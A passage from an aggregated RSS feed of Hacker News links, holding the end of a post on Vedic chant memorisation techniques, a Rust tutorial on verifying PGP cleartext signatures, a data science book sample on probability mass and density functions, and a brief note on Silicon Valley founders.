<p>How do you ensure that a spoken text doesn’t shift with the retelling? Well, the integrity of the Vedas is sustained through a sophisticated set of processes that are so ingrained in Hindu tradition that it can be described as a “memory culture.” Students spend years memorising the Vedic chant, more than ten thousand separate verses. And they learn it in several different ways – called Pathas – creating a kind of built-in error correction mechanism.</p>
<p>The Vedic chant is learned as Samhita – something like natural connected speech, as one might talk. And it is learned as Pada – each word alone, enunciating and focusing on the words separately. And it is learned as Krama – to enhance memory, the words are recited in pairs, the second word becoming the first of the next pair so that the whole text forms a long chain (“the rain in Spain” would become “the rain, rain in, in Spain”). Here’s an example of that one:</p>
<p><span><iframe width="656" height="369" src="https://www.youtube.com/embed/UKk6Z6F8tXw?version=3&amp;rel=1&amp;showsearch=0&amp;showinfo=1&amp;iv_load_policy=1&amp;fs=1&amp;hl=en&amp;autohide=2&amp;wmode=transparent" allowfullscreen="true" sandbox="allow-scripts allow-same-origin allow-popups allow-presentation"></iframe></span></p>

<p>Other pathas shift the text around in interesting ways – reversing the order of words, for example – with the goal of creating as many redundancies in the memorisation process as possible. And it’s not just the ears and the voice that are involved here: teachers and students use their bodies too. The teachers who are teaching the chants will move their hands to indicate the Sanskrit tones used, and the students will tilt their heads in response. It’s all carefully designed to ensure that the Vedas are passed down completely intact, words and sounds and all. Amazing.</p>
<ul>
<li><a href="https://en.wikipedia.org/wiki/Vedic_chant">Vedic chant</a></li>
<li><a href="https://en.wikipedia.org/wiki/Vedas">Vedas</a>&nbsp;</li>
</ul>



		<p>Categories: <a href="https://generalist.academy/category/arts-recreation/" rel="category tag">Arts &amp; recreation</a> <a href="https://generalist.academy/category/places/asia/" rel="category tag">Asia</a> <a href="https://generalist.academy/category/language/" rel="category tag">Language</a> <a href="https://generalist.academy/category/arts-recreation/literature/" rel="category tag">Literature</a> <a href="https://generalist.academy/category/places/" rel="category tag">Places</a> <a href="https://generalist.academy/category/religion-belief/" rel="category tag">Religion &amp; belief</a>		</p>
	<div>
		<p><img alt="" src="https://0.gravatar.com/avatar/f7eb82f9df252be8cad1a3993809331d?s=100&amp;d=https%3A%2F%2F0.gravatar.com%2Favatar%2Fad516503a11cd5ca435acc9bb6523536%3Fs%3D100&amp;r=G" height="100" width="100"></p><h3>The Generalist</h3>
		<p>I live in Auckland, New Zealand, and am curious about most things.</p>
	</div>
	</section>
</article></div>]]>
            </description>
            <link>https://generalist.academy/2020/10/18/memory-culture/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25074298</guid>
            <pubDate>Thu, 12 Nov 2020 20:12:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Build your own GPG in Rust]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25073982">thread link</a>) | @fanf2
<br/>
November 12, 2020 | https://andrewhalle.github.io/build-your-own/gpg | <a href="https://web.archive.org/web/*/https://andrewhalle.github.io/build-your-own/gpg">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="write"><p><span>By: </span><a href="https://github.com/andrewhalle"><span>Andrew Halle</span></a>
<span>Repo: </span><a href="https://github.com/andrewhalle/byo-gpg"><span>byo-gpg</span></a>
<span>Date: 2020-11-07</span></p><p><span>Part of </span><a href="https://andrewhalle.github.io/build-your-own"><span>build-your-own</span></a></p><h2><a name="background"></a><span>Background</span></h2><p><span>GPG (stands for Gnu Privacy Guard) is an implementation of PGP (which stands for Pretty Good Privacy), an open standard for encryption specified by </span><a href="https://tools.ietf.org/html/rfc4880"><span>RFC 4880</span></a><span>. In this post, we'll build up a program in Rust that implements one part of the PGP standard, verifying cleartext signatures.</span></p><p><em><span>(note: I think it's hilarious that GPG is an implementation of PGP. The obvious right choice was to call it GPGP. I considered calling my tool PGPG, but ultimately decided on pgp-rs, because I'm boring.)</span></em></p><p><span>PGP supports a number of different cryptography suites, but the default cipher suite, and the one I'm most familiar with, is RSA cryptography. A quick review of </span><a href="https://en.wikipedia.org/wiki/RSA_(cryptosystem)"><span>RSA</span></a><span> might be warranted (it certainly was for me).</span></p><h3><a name="rsa"></a><span>RSA</span></h3><p><span>RSA is a public-key cryptosystem (one in which parts of the key used for encryption are allowed to be non-secret) which relies on the impracticality of factoring very large (a normal figure is 2048 bits) composite numbers. Put another way, it is easy to find 3 large integers n, d, and e with the property that</span></p><p><span>but it's very difficult, given only m, e and n, to discover d. In this way, the tuple (e,n) forms the public key, which can be broadcast to the world, and the tuple (e,d,n) forms the private key, which is kept secret. Messages can be encrypted by computing the ciphertext C</span></p><p><span>C can then be decrypted by anyone with the corresponding private key by computing</span></p><p><span>So C forms a secret message that's only readable by the intended recipient. Similarly, the owner of the private key can compute a signature S</span></p><p><span>which can be verified by anyone with the public key by computing</span></p><p><span>In this way, the owner of the private key can create something that can be verified to be authentic.</span></p><h3><a name="gpg-operation"></a><span>GPG operation</span></h3><p><span>GPG provides operations for generating and distributing keys, encrypting messages, and producing signatures. The particular operation we're interested in right now is producing a </span><em><span>cleartext signature</span></em><span>, one that includes the message for anyone to read, and an associated signature that confirms the message is from the owner of the private key.</span></p><p><span>In order to produce a cleartext signature, you must first generate a public/private key pair.</span></p><pre spellcheck="false" lang=""></pre><p><span>GPG will ask for some identifying information, generate a new key (RSA by default), and store it in the keyring. The key can be exported to a file (important for us to ingest it!) via</span></p><pre spellcheck="false" lang=""></pre><p><span>We'll get into the format of this key later.</span></p><p><span>With a key in hand, we can generate a cleartext signature via</span></p><pre spellcheck="false" lang=""></pre><p><em><span>(note: use </span><a href="https://github.com/sharkdp/bat"><span>bat</span></a><span>! it's great)</span></em></p><p><span>This is the full signature of the text "hello world" using the keypair I generated for this blog post. We'll also get into the format of this signature later. You now as familiar with GPG as you need to be to go through the rest of this post. So, let's start writing some code!</span></p><h2><a name="getting-started"></a><span>Getting started</span></h2><h3><a name="dependencies"></a><span>Dependencies</span></h3><p><span>We start in the normal way</span></p><pre spellcheck="false" lang=""></pre><p><span>I'll go ahead and add all the dependencies we'll need upfront, just to get it out of the way.</span></p><pre spellcheck="false" lang="toml"></pre><p><span>we'll use</span></p><ul><li><a href="https://crates.io/crates/clap"><span>clap</span></a><span> for easily building a CLI </span><em><span>(admittedly this is overkill for a program that does one thing, I originally intended to build out more PGP functionality, before deciding that cleartext signatures alone exercise all the interesting characteristics I wanted to)</span></em></li><li><a href="https://crates.io/crates/num"><span>num</span></a><span> for working with big numbers, and doing modular exponentiation</span></li><li><a href="https://crates.io/crates/nom"><span>nom</span></a><span> for parsing our files, nom is a parser combinator library (I'll explain that a bit more later)</span></li><li><a href="https://crates.io/crates/base64"><span>base64</span></a><span> for decoding base64 data</span></li><li><a href="https://crates.io/crates/byteorder"><span>byteorder</span></a><span> for decoding numbers of a particular endianness</span></li><li><a href="https://crates.io/crates/anyhow"><span>anyhow</span></a><span> for easy error handling</span></li><li><a href="https://crates.io/crates/sha2"><span>sha2</span></a><span> for computing hash functions (more on this later)</span></li><li><a href="https://crates.io/crates/regex"><span>regex</span></a><span> for replacing newlines </span><em><span>(squints at everyone using windows)</span></em></li><li><a href="https://crates.io/crates/assert_cmd"><span>assert_cmd</span></a><span> for easy integration testing</span></li></ul><p><em><span>(note: phew)</span></em></p><h3><a name="cli"></a><span>CLI</span></h3><p><span>Okay, with that out of the way, we can </span><em><span>really</span></em><span> start writing some code!</span></p><p><span>In </span><code>main.rs</code><span> we put our clap description of our CLI</span></p><pre spellcheck="false" lang="rust"></pre><p><span>I personally really like the macro method of specifying the CLI, but there are other methods. This defines an app (and its metadata) as well as a subcommand </span><code>verify</code><span> that takes two command line arguments, </span><code>source</code><span> which will be the cleartext signature we're verifying, and </span><code>publicKey</code><span> which will be the public key we use to verify it. After parsing the command-line arguments, and providing some sensible defaults, we call out to </span><code>pgp_rs::verify_cleartext_message</code><span> which we define in </span><code>lib.rs</code><span> (I'll stop including filenames from here on out, find the code in the </span><a href="https://github.com/andrewhalle/byo-gpg"><span>repo</span></a><span>!)</span></p><pre spellcheck="false" lang="rust"></pre><p><em><span>(note: this snippet of code uses types </span><code>CleartextSignature</code><span> and </span><code>PublicKey</code><span> which we haven't defined yet. I'm just sketching out the broad structure of this method to get the boring stuff out of the way first.)</span></em></p><p><span>We parse the cleartext signature and the key, and then verify the signature with the key. If the signature fails to verify with the key, we return an error so the program exits with an error code (I'll ignore the modules set up in this snippet for the rest of the write-up).</span></p><p><span>Now, we can get into the meat of this code, the parsing functions. In order to do </span><em><span>that</span></em><span> however, we have to take a brief detour </span><em><span>INTO THE RFC</span></em><span>. Take this </span><code>::&lt;&gt;</code><span>, it's dangerous to go alone.</span></p><h2><a name="implementation"></a><span>Implementation</span></h2><p><span>The RFC containing the details of PGP is </span><a href="https://tools.ietf.org/html/rfc4880"><span>RFC 4880</span></a><span>. The main sections of the RFC we'll need to deal with in this blog post are sections </span><a href="https://tools.ietf.org/html/rfc4880#section-3.2"><span>3.2</span></a><span>, </span><a href="https://tools.ietf.org/html/rfc4880#section-4"><span>4</span></a><span>, </span><a href="https://tools.ietf.org/html/rfc4880#section-5.2.3"><span>5.2.3</span></a><span>, </span><a href="https://tools.ietf.org/html/rfc4880#section-5.2.4"><span>5.2.4</span></a><span>, </span><a href="https://tools.ietf.org/html/rfc4880#section-5.5.1.1"><span>5.5.1.1</span></a><span>, </span><a href="https://tools.ietf.org/html/rfc4880#section-6.1"><span>6.1</span></a><span>, </span><a href="https://tools.ietf.org/html/rfc4880#section-6.2"><span>6.2</span></a><span>, and </span><a href="https://tools.ietf.org/html/rfc4880#section-7"><span>7</span></a><span>.</span></p><h3><a name="cleartext-signatures"></a><span>Cleartext signatures</span></h3><p><span>The functionality of PGP that we're implementing is validating </span><em><span>cleartext signatures</span></em><span> (described in </span><a href="https://tools.ietf.org/html/rfc4880#section-7"><span>section 7</span></a><span> of the RFC). A cleartext signature is a signature that embeds the text being signed in a readable way into the signature itself. It has several parts:</span></p><ul><li><span>a header of </span><code>-----BEGIN PGP SIGNED MESSAGE-----</code></li><li><span>one or more </span><code>Hash</code><span> armor headers</span></li><li><span>one empty line</span></li><li><span>the dash-escaped cleartext</span></li><li><span>the ASCII-armored signature</span></li></ul><p><span>We'll talk about parsing ASCII armor in the next section, but we have enough information to parse most of this already. In order to recognize a cleartext signature, we need to first look for the header, followed by a </span><code>Hash: &lt;alg&gt;</code><span> (</span><code>alg</code><span> in this case will be SHA256, but there are other options), an empty line, the cleartext, then finally the signature.</span></p><p><span>The cleartext will be in form called "dash-escaped", which is described in the RFC. Dash-escaped text is the same as normal text, but if the line starts with a literal </span><code>-</code><span>, then it is prefixed by a dash, followed by a space. We'll know when we're done with parsing the cleartext because the ASCII armor always starts with a line beginning with 5 dashes, which we will recognize as not being dash-escaped.</span></p><p><span>I'll be using </span><a href="https://crates.io/crates/nom"><span>nom</span></a><span> to build all the different parsers we'll need. Nom is a </span><em><span>parser combinator</span></em><span> library. Parser combinators are a technique for writing parsers where simple parsers (say, for recognizing a literal word, or a string of characters which are all </span><code>a</code><span>) are combined to form more complex parsers. All nom parsers have the signature</span></p><pre spellcheck="false" lang="rust"></pre><p><span>where </span><code>T</code><span> is the raw type we're parsing from (usually </span><code>&amp;str</code><span> or </span><code>&amp;[u8]</code><span>) and </span><code>U</code><span> is the type we're parsing. The parser either succeeds or fails, and if it succeeds, it returns a tuple of </span><code>(T, U)</code><span> where the first entry of the tuple is the remaining input, and the second entry of the tuple is what was parsed. For example, a simple parser that parses a </span><code>Color</code><span> enum from a string could look like</span></p><pre spellcheck="false" lang="rust"></pre><p><span>This example defines 3 parsers, </span><code>parse_red</code><span>, </span><code>parse_green</code><span>, and </span><code>parse_blue</code><span>, which look for a literal string, and if it's found, return the associated </span><code>Color</code><span> variant. If the input does not contain the string literal, the parser fails (that's why we can ignore the result of the tag parser, we know what it was, and we can return the built value we wanted). </span><code>parse_color</code><span> is then built from these basic blocks using the </span><code>alt</code><span> combinator, which succeeds if one of the parsers passed to it in a tuple succeeds, and it succeeds with that result. The </span><code>main</code><span> function then parses a single color from the string </span><code>"Green123"</code><span>, leaving the </span><code>123</code><span> string remaining.</span></p><p><span>Now to parse a cleartext signature using nom, we first define a </span><code>struct</code><span> to parse into</span></p><pre spellcheck="false" lang="rust"></pre><p><span>The </span><code>hash</code><span> field will hold the hash variant we're using (could have been an enum if we were being rigorous, or supporting more than just SHA256), the cleartext (after we remove the dash-escaping), and then the signature (which we'll get to later).</span></p><p><span>The parser for our cleartext signature will look like the following</span></p><pre spellcheck="false" lang="rust"></pre><p><span>This parser first recognizes the header, then the hash variant, then the cleartext, then the parts of the ASCII armor. It also enforces that there's no more input to consume using the </span><code>all_consuming</code><span> parser. Assuming all that is successful, we return the pieces we need to assemble the cleartext signature.</span></p><p><span>Drilling down into the methods we decreed must exist</span></p><pre spellcheck="false" lang="rust"></pre><p><code>alphanumeric1</code><span> is a parser included with nom that recognizes at least one alphanumeric character. </span><code>preceded</code><span> is a parser that takes two parsers as argument, it returns as a success the result of the second parser, if both succeed. </span><code>terminated</code><span> is a parser that takes two parsers as argument, and returns as success the result of the first parser, if both are successful. So, the </span><code>parse_hash_armor_header</code><span> function recognizes an </span><code>alphanumeric1</code><span> string preceded by </span><code>Hash:</code><span> and returns it, ignoring any trailing newlines.</span></p><pre spellcheck="false" lang="rust"></pre><p><code>parse_possibly_dash_escaped_chunk</code><span> uses a helper I wrote </span><code>fold_into_string</code><span> which takes a parser that parses a single line of text and runs it repeatedly (until it fails), collecting the results into a </span><code>String</code><span>. We then </span><code>pop()</code><span> the last character off the string, because we don't need the last newline.</span></p><pre spellcheck="false" lang="rust"></pre><p><code>parse_possibly_dash_escaped_line</code><span> uses the </span><code>alt</code><span> combinator we've already seen to either parse a line beginning with no dash, or a line beginning with a dash-space. </span><code>parse_line_newline_inclusive</code><span> is a helper to grab a string slice including the last newline. Because nom parsers can recognize up to the newline, but not go past it in the same breath, I needed an unsafe function to consume the newline, and then modify the resulting string slice to be 1 byte longer, which is safe because I know the next byte was a newline (or the parser would have failed).</span></p><pre spellcheck="false" lang="rust"></pre><p><span>Now, we can go back up and see the </span><code>Cleartext::parse</code><span> function</span></p><pre spellcheck="false" lang="rust"></pre><p><span>Not every line of this is clear yet. We haven't talked about ASCII armor or PGP packets at all yet. Nonetheless, …</span></p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://andrewhalle.github.io/build-your-own/gpg">https://andrewhalle.github.io/build-your-own/gpg</a></em></p>]]>
            </description>
            <link>https://andrewhalle.github.io/build-your-own/gpg</link>
            <guid isPermaLink="false">hacker-news-small-sites-25073982</guid>
            <pubDate>Thu, 12 Nov 2020 19:43:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Essential Math for Data Science: Probability mass and density functions]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25073949">thread link</a>) | @magicbean
<br/>
November 12, 2020 | https://hadrienj.github.io/posts/Essential-Math-probability-distributions/ | <a href="https://web.archive.org/web/*/https://hadrienj.github.io/posts/Essential-Math-probability-distributions/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><p> This post is a sample of my book <b>Essential Math for Data Science</b>!</p><p>Learn the math needed for data science and machine learning using a <span>practical approach with Python</span>.</p><div><p>Get it before the 30th of November 2020 and benefit from a <b>HUGE DISCOUNT</b>!</p><p><a href="https://www.essentialmathfordatascience.com/"> <b>GET THE BOOK</b> </a></p></div></div><p><img src="https://hadrienj.github.io/assets/images/cover_free_sample.jpg" width="200px"></p></div><p>In the chapter 02 of <a href="https://www.essentialmathfordatascience.com/">Essential Math for Data Science</a>, you can learn about basic descriptive statistics and probability theory. We’ll cover probability mass and probability density function in this sample. You’ll see how to understand and represent these distribution functions and their link with histograms.</p><p><em>Deterministic</em> processes give the same results when they are repeated multiple times. This is not the case for random variables, which describe <em>stochastic</em> events, in which randomness characterizes the process.</p><p>This means that random variables can take various values. How can you describe and compare these values? One good way is to use the probability that each outcome will occur. The probability distribution of a random variable is a function that takes the sample space as input and returns probabilities: in other words, it maps possible outcomes to their probabilities.</p><p>In this section, you’ll learn about probability distributions for discrete and continuous variables.</p><h3 id="sec:ch11_probability_mass_functions">Probability Mass Functions</h3><p>Probability functions of discrete random variables are called <em>probability mass functions</em> (or PMF). For instance, let’s say that you’re running a dice-rolling experiment. You call $\rx$ the random variable corresponding to this experiment. Assuming that the die is fair, each outcome is <em>equiprobable</em>: if you run the experiment a large number of times, you will get each outcome approximately the same number of times. Here, there are six possible outcomes, so you have one chance over six to draw each number.</p><p>Thus, the probability mass function describing $\rx$ returns $\frac{1}{6}$ for each possible outcome and 0 otherwise (because you can’t get something different than 1, 2, 3, 4, 5 or 6).</p><p>You can write $P(\rx = 1) = \frac{1}{6}$, $P(\rx = 2) = \frac{1}{6}$, and so on.</p><h4 id="properties-of-probability-mass-functions">Properties of Probability Mass Functions</h4><p>Not every function can be considered as a probability mass function. A probability mass function must satisfy the following two conditions:</p><ul><li>The function must return values between 0 and 1 for each possible outcome:</li></ul><p>\[0 \leq P(x) \leq 1\]</p><ul><li>The sum of probabilities corresponding to all the possible outcomes must be equal to 1:</li></ul><p>\[\sum\limits_{x \in S} P(x) = 1\]</p><p>The value of $x$ can be any real number because values outside of the sample space are associated with a probability of 0. Mathematically, for any value $x$ not in the sample space $S$, $P(x)=0$.</p><h4 id="simulation-of-the-dice-experiment">Simulation of the Dice Experiment</h4><p>Let’s simulate a die experiment using the function <code>np.random.randint(low, high, size)</code> from Numpy which draw $n$ (<code>size</code>) random integers between <code>low</code> and <code>high</code> (excluded). Let’s simulate 20 die rolls:</p><div><div><pre><code>
<span>rolls</span> <span>=</span> <span>np</span><span>.</span><span>random</span><span>.</span><span>randint</span><span>(</span><span>1</span><span>,</span> <span>7</span><span>,</span> <span>20</span><span>)</span>
<span>rolls</span>
</code></pre></div></div><div><div><pre><code>array([6, 3, 5, ..., 6, 5, 1])
</code></pre></div></div><p>This array contains the 20 outcomes of the experiment. Let’s call $\rx$ the discrete random variable corresponding to the die rolling experiment. The probability mass function of $\rx$ is defined only for the possible outcomes and gives you the probability for each of them.</p><p>Assuming the die is fair, you should have an <em>uniform distribution</em>, that is, equiprobable outcomes..</p><p>Let’s visualize the quantity of each outcome you got in the random experiment. You can divide by the number of trials to get the probability. Let’s use <code>plt.stem()</code> from Matplotlib to visualize these probabilities:</p><div><div><pre><code><span>val</span><span>,</span> <span>counts</span> <span>=</span> <span>np</span><span>.</span><span>unique</span><span>(</span><span>rolls</span><span>,</span> <span>return_counts</span><span>=</span><span>True</span><span>)</span>
<span>plt</span><span>.</span><span>stem</span><span>(</span><span>val</span><span>,</span> <span>counts</span><span>/</span><span>len</span><span>(</span><span>rolls</span><span>),</span> <span>basefmt</span><span>=</span><span>"C2-"</span><span>,</span> <span>use_line_collection</span><span>=</span><span>True</span><span>)</span>

</code></pre></div></div><p><img src="https://hadrienj.github.io/assets/images/ch03_probability_distributions/ch03_probability_distributions_9_0.png" alt="Figure 1: Probability mass function of the random variable $\rx$ corresponding to a die rolling a six-sided die estimated from 20 rolls." width="250px"> <em>Figure 1: Probability mass function of the random variable $\rx$ corresponding to a die rolling a six-sided die estimated from 20 rolls.</em></p><p>With a uniform distribution, the plot would have the same height for each outcome (since the height corresponds to the probability, which is the same for each outcome of a die throw). However, the distribution shown in Figure 1 doesn’t look uniform. That’s because you didn’t repeat the experiment enough: the probabilities will stand when you repeat the experiment a large number of times (in theory, an infinite number of times).</p><p>Let’s increase the number of trials:</p><div><div><pre><code>
<span>throws</span> <span>=</span> <span>np</span><span>.</span><span>random</span><span>.</span><span>randint</span><span>(</span><span>1</span><span>,</span> <span>7</span><span>,</span> <span>100000</span><span>)</span>
<span>val</span><span>,</span> <span>counts</span> <span>=</span> <span>np</span><span>.</span><span>unique</span><span>(</span><span>throws</span><span>,</span> <span>return_counts</span><span>=</span><span>True</span><span>)</span>
<span>plt</span><span>.</span><span>stem</span><span>(</span><span>val</span><span>,</span> <span>counts</span><span>/</span><span>len</span><span>(</span><span>throws</span><span>),</span> <span>basefmt</span><span>=</span><span>"C2-"</span><span>,</span> <span>use_line_collection</span><span>=</span><span>True</span><span>)</span>

</code></pre></div></div><p><img src="https://hadrienj.github.io/assets/images/ch03_probability_distributions/ch03_probability_distributions_11_0.png" alt="Figure 2: Probability mass function of the random variable $\rx$ corresponding to a die rolling experiment estimated from 100,000 rolls." width="250px"> <em>Figure 2: Probability mass function of the random variable $\rx$ corresponding to a die rolling experiment estimated from 100,000 rolls.</em></p><p>With enough trials, the probability mass function showed in Figure 2 looks uniform. This underline the importance of the number of trials from a frequentist probability point of view.</p><h3 id="sec:ch11_section_probability_density_functions">Probability Density Functions</h3><p>With continuous variables, there is an infinite number of possible outcomes (limited by the number of decimals you use). For instance, if you were drawing a number between 0 and 1 you might get an outcome of, for example, 0.413949834. The probability of drawing each number tends towards zero: if you divide something by a very large number (the number of possible outcomes), the result will be very small, close to zero. This is not very helpful in describing random variables.</p><p>It is better to consider the probability of getting a specific number within a range of values. The $y$-axis of probability density functions is not a probability. It is called a <em>probability density</em> or just <em>density</em>. Thus, probability distributions for continuous variables are called <em>probability density functions</em> (or PDF).</p><p>The integral of the probability density function over a particular interval gives you the probability that a random variable takes a value in this interval. This probability is thus given by the area under the curve in this interval (as you can see in <a href="https://www.essentialmathfordatascience.com/">Essential Math for Data Science</a>).</p><h4 id="notation">Notation</h4><p>Here, I’ll denote probability density functions using a lowercase $p$. For instance, the function $p(x)$ gives you the density corresponding to the value $x$.</p><h4 id="example">Example</h4><p>Let’s inspect an example of probability density function. You can randomly draw data from a normal distribution using the Numpy function <code>np.random.normal</code> (you’ll find more details about the normal distribution in <a href="https://www.essentialmathfordatascience.com/">Essential Math for Data Science</a>).</p><p>You can choose the parameters of the normal distribution (the mean and the standard deviation) and the number of samples. Let’s create a variable <code>data</code> with 1,000 values drawn randomly from a normal distribution with a mean of 0.3 and a standard deviation of 0.1.</p><div><div><pre><code><span>np</span><span>.</span><span>random</span><span>.</span><span>seed</span><span>(</span><span>123</span><span>)</span>
<span>data</span> <span>=</span> <span>np</span><span>.</span><span>random</span><span>.</span><span>normal</span><span>(</span><span>0.3</span><span>,</span> <span>0.1</span><span>,</span> <span>1000</span><span>)</span>
</code></pre></div></div><p>Let’s look at the shape of the distribution using an histogram. The function <code>plt.hist()</code> returns the exact values for the $x$- and $y$-coordinates of the histogram. Let’s store this in a variable called <code>hist</code> for latter use:</p><div><div><pre><code><span>hist</span> <span>=</span> <span>plt</span><span>.</span><span>hist</span><span>(</span><span>data</span><span>,</span> <span>bins</span><span>=</span><span>13</span><span>,</span> <span>range</span><span>=</span><span>(</span><span>-</span><span>0.3</span><span>,</span> <span>1</span><span>))</span>
</code></pre></div></div><p><img src="https://hadrienj.github.io/assets/images/ch03_probability_distributions/ch03_probability_distributions_19_0.png" alt="Figure 3: Histogram of the data generated from a normal distribution. The $x$-axis is the value of the element in the vector and the $y$-axis the number of elements (count) that are in the corresponding range." width="250px"> <em>Figure 3: Histogram of the data generated from a normal distribution. The $x$-axis is the value of the element in the vector and the $y$-axis the number of elements (count) that are in the corresponding range.</em></p><div><p><b>Histograms</b></p><p><it>Histograms</it> show how values are distributed. It is a way to model a probability distribution using a finite number of values from the distribution. Since we're dealing with continuous distributions, this histogram corresponds to the number of values for specific intervals (the intervals depends on the parameter <code>bins</code> in the function <code>hist()</code>).</p><p>For instance, Figure 3 shows that there are around 347 elements in the interval (0.2, 0.3). Each bin corresponds to a width of 0.1, since we used 13 bins to represent data in the range -0.3 to 1.</p></div><p>Let’s have a closer look at the distribution with more bins. You can use the parameter <code>density</code> to make the $y$-axis correspond to the probability density instead of the count of values in each bin:</p><div><div><pre><code><span>hist</span> <span>=</span> <span>plt</span><span>.</span><span>hist</span><span>(</span><span>data</span><span>,</span> <span>bins</span><span>=</span><span>24</span><span>,</span> <span>range</span><span>=</span><span>(</span><span>-</span><span>0.2</span><span>,</span> <span>1</span><span>),</span> <span>density</span><span>=</span><span>True</span><span>)</span>

</code></pre></div></div><p><img src="https://hadrienj.github.io/assets/images/ch03_probability_distributions/ch03_probability_distributions_22_0.png" alt="Figure 4: Histogram using 30 bins and density instead of counts." width="250px"> <em>Figure 4: Histogram using 30 bins and density instead of counts.</em></p><p>You can see in Figure 4 that there are more bins in this histogram (24 instead of 13). This means that each bin has now a smaller width. The $y$-axis is also on a different scale: it corresponds to the density, not the counter of values as before.</p><p>To calculate the probability to draw a value in a certain range from the density, you need to use the area under the curve. In the case of histograms, this is the area of the bars.</p><p>Let’s take an example with the bar ranging from 0.2 to 0.25, associated with the following density:</p><div><div><pre><code><span>print</span><span>(</span><span>f"Density: </span><span>{</span><span>hist</span><span>[</span><span>0</span><span>][</span><span>8</span><span>].</span><span>round</span><span>(</span><span>4</span><span>)</span><span>}</span><span>"</span><span>)</span>
<span>print</span><span>(</span><span>f"Range x: from </span><span>{</span><span>hist</span><span>[</span><span>1</span><span>][</span><span>8</span><span>].</span><span>round</span><span>(</span><span>4</span><span>)</span><span>}</span><span> to </span><span>{</span><span>hist</span><span>[</span><span>1</span><span>][</span><span>9</span><span>].</span><span>round</span><span>(</span><span>4</span><span>)</span><span>}</span><span>"</span><span>)</span>
</code></pre></div></div><div><div><pre><code>Density: 2.8
Range x: from 0.2 to 0.25
</code></pre></div></div><p>Since there are 24 bins and the range of possible outcomes is from -0.2 to 1, each bar corresponds to a range of $\frac{1-(-0.2)}{24}=\frac{1.2}{24}=0.05$. In our example, the height of the bar (the one from 0.2 to 0.25) is around 2.8, so the area of this bar is $2.8 \cdot 0.05 = 0.14$. This means that the probability of getting a value between 0.2 and 0.25 is around 0.14, or 14%.</p><p>You saw that the sum of the probabilities must be equal to one, so the sum of the bar’s areas should be equal to one. Let’s check that: you can take the vector containing the densities (<code>hist[0]</code>) and multiply it by the bar width (0.05):</p><div><div><pre><code><span>(</span><span>hist</span><span>[</span><span>0</span><span>]</span> <span>*</span> <span>0.05</span><span>).</span><span>sum</span><span>().</span><span>round</span><span>(</span><span>4</span><span>)</span>
</code></pre></div></div><p>All good: the sum of the probabilities is equal to one.</p><h4 id="from-histograms-to-continuous-probability-density-functions">From Histograms to Continuous Probability Density Functions</h4><p>Histograms represent a binned version of the probability density function. Figure 5 shows a representation of the true probability density function. The blue shaded area in the figure corresponds to the probability of getting a number between 0 and 0.2 (the area under the curve between 0 and 0.2).</p><p><img src="https://hadrienj.github.io/assets/images/ch03_probability_distributions/ch03_probability_density_function_area.png" alt="Figure 5: The probability to draw a number between 0 and 0.2 is the highlighted area under the curve." width="300px"> <em>Figure 5: The probability to draw a number between 0 and 0.2 is the highlighted area under the curve.</em></p><h4 id="properties-of-probability-density-functions">Properties of Probability Density Functions</h4><p>Like probability mass functions, probability density functions must satisfy some requirements. The first is that it must return only non negative values. …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://hadrienj.github.io/posts/Essential-Math-probability-distributions/">https://hadrienj.github.io/posts/Essential-Math-probability-distributions/</a></em></p>]]>
            </description>
            <link>https://hadrienj.github.io/posts/Essential-Math-probability-distributions/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25073949</guid>
            <pubDate>Thu, 12 Nov 2020 19:39:17 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[One untold truth about the geniuses in Silicon Valley]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25073827">thread link</a>) | @kirillzubovsky
<br/>
November 12, 2020 | https://smashnotes.com/p/below-the-line-with-james-beshara/e/3-eric-ries-psychological-journey/s/what-is-one-untold-truth-about-genius-in-silicon-valley | <a href="https://web.archive.org/web/*/https://smashnotes.com/p/below-the-line-with-james-beshara/e/3-eric-ries-psychological-journey/s/what-is-one-untold-truth-about-genius-in-silicon-valley">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>
        What is the untold truth about the geniuses in Silicon Valley?
    </p>
    
    <div>
      <p>Often times even the geniuses in Silicon Valley don't know how great of a product they have until it is beyond popular. </p>

<p>During the early days of Facebook, for example, the founders were busy working on side projects, even as users were breaking down the front door asking to be let onto the platform. The first version of Instagram was a massive failure. The list is long.</p>

<p>Once the product is popular though, the geniuses can do a lot of things wrong and still succeed because the core of their success is so strong, it cannot fail.</p>
    </div>
      <h5>You might also like</h5>
        <a title="How did Sahil Lavingia start Gumroad?" href="https://smashnotes.com/p/below-the-line-with-james-beshara/e/11-sahil-lavingia-solo-journey/s/how-did-sahil-lavingia-start-gumroad">
          <div>
            <div>
            
            <div>
            <p>How did Sahil Lavingia start Gumroad</p>
            <p>Sahil started with the idea for Gumroad while still working at Pinterest ba ...</p>
            </div>
            </div>
          </div>
        </a>        <a title="How successful was Y Combinator aiming to become?" href="https://smashnotes.com/p/econtalk-archives-2009/e/graham-on-start-ups-innovation-and-creativity/s/how-successful-was-y-combinator-aiming-to-become">
          <div>
            <div>
            
            <div>
            <p>How successful was Y Combinator aiming to become</p>
            <p>While investing 7 times the volume, and 1/100s the amount in comparison to  ...</p>
            </div>
            </div>
          </div>
        </a>        <a title="What makes for a great hacker?" href="https://smashnotes.com/p/econtalk-archives-2009/e/graham-on-start-ups-innovation-and-creativity/s/what-makes-for-a-great-hacker">
          <div>
            <div>
            
            <div>
            <p>What makes for a great hacker</p>
            <p>In both programming and paining, there are people who are amazingly talente ...</p>
            </div>
            </div>
          </div>
